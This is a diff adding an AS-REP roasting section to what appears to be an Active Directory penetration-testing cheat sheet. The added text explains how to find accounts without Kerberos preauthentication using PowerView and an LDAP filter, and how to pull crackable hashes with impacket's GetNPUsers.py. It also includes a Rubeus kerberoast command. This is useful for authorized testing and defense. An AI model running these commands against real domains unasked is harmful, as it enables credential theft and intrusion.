@@ -33,6 +33,27 @@ Rubeus.exe kerberoast /creduser:"<fqdn_dom>\<user>" /credpassword:"<password>" /
 ```
 
 
+### Kerberos preauthentication
+
+A domain user can have the property "Do net required Kerberos preauthentication".
+In this configuration, it's possible to ask to the KDC a TGT that is signed with
+the user password. So the clear password can be retrieve with a brute-force attack.
+
+The goal is to list the users that have this settings enable:
+
+- [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/445f7b2510c4553dcd9451bc4daccb20c8e67cbb/Recon/PowerView.ps1) : `Get-DomainUser -PreauthNotRequired`
+- LDAP: `userAccountControl:1.2.840.113556.1.4.803:=4194304`
+
+Then you can use the `impacket` script [`GetNPUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
+to get the TGT in a format the `John` or `Hashcat ` can brute-force:
+
+```bash
+python GetNPUsers.py <domain>/ -usersfile users.txt -format <john/empty> -outputfile hashes.txt
+```
+
+From [@harmj0y](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py).
+
+
 ### Collect AD users information
 ```powerhsell
 # Helping functions
